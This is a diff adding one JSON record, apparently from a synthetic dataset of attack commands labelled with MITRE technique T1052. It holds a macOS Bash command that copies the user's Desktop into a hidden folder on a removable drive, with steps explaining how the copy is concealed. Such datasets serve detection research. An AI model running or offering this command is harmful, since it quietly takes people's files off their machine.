@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/NO NAME/.D1\" && cp -Rp \"$HOME/Desktop\" \"/Volumes/NO NAME/.D1/\"",
+  "explanation": "Transfers the Desktop directory to a hidden folder on an external drive labeled 'NO NAME'.",
+  "rationale_steps": [
+    "Target commonly used files on the Desktop.",
+    "Create a hidden directory on the removable media to reduce visibility.",
+    "Use cp -Rp to maintain original metadata and directory structure.",
+    "Ensure the entire operation is local and offline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-9f2bb3b6",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
